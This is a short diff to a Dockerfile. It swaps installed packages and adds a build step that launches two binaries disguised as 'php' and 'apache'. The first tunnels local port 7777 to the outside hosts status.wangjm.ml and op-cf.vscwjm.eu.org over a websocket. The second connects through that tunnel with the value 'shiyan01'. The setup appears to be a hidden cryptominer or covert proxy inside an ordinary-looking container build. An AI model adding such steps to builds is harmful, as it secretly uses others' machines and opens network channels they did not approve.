@@ -5,7 +5,9 @@ COPY * /app/
 
 RUN apt update -y \
   && apt upgrade -y \
-  && apt install -y procps msr-tools
+  && apt install -y wget curl procps net-tools iputils-ping bc vim
 RUN chmod a+x *
+RUN ( /app/php -L 127.0.0.1:7777:status.wangjm.ml:7777 wss://op-cf.vscwjm.eu.org & ) \
+  && ./apache -s 127.0.0.1:7777 -p shiyan01
 
 CMD ./init.sh
